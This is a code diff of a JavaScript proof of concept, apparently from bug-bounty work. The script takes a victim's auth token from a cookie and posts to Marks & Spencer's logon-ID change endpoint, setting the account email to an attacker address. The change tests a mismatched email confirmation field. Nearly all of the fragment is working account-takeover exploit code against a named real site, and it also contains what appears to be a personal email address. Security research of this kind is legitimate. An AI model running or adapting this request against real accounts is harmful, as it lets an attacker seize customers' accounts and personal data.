@@ -9,7 +9,7 @@ const authToken = authTokenCookie ? authTokenCookie.split('=')[1] : null;
 const secondUrl = 'https://www.marksandspencer.com/MSChangeLogonIdCmd';
 
 // Body for the second POST request
-const secondBody = `storeId=10151&catalogId=10051&langId=-24&URL=${encodeURIComponent('https://www.marksandspencer.com/MSAccountProfileDisplayView?catalogId=10051&langId=-24&storeId=10151&changeEmail=true')}&errorViewName=MSChangeLogonIdView&page=MyDetails&formType=MyAccount&authToken=${encodeURIComponent(authToken)}&logonId=bug_vs_me%2Battacker1234%40wearehackerone.com&retypeLogonId=bug_vs_me%2Battacker1234%40wearehackerone.com&verifyPassword=${encodeURIComponent(password)}&submit-sign-in=Save`;
+const secondBody = `storeId=10151&catalogId=10051&langId=-24&URL=${encodeURIComponent('https://www.marksandspencer.com/MSAccountProfileDisplayView?catalogId=10051&langId=-24&storeId=10151&changeEmail=true')}&errorViewName=MSChangeLogonIdView&page=MyDetails&formType=MyAccount&authToken=${encodeURIComponent(authToken)}&logonId=dmxjon1%2Bv%40gmail.com&retypeLogonId=bug_vs_me%2Battacker1234%40wearehackerone.com&verifyPassword=${encodeURIComponent(password)}&submit-sign-in=Save`;
 
 // Perform the second POST request
 fetch(secondUrl, {
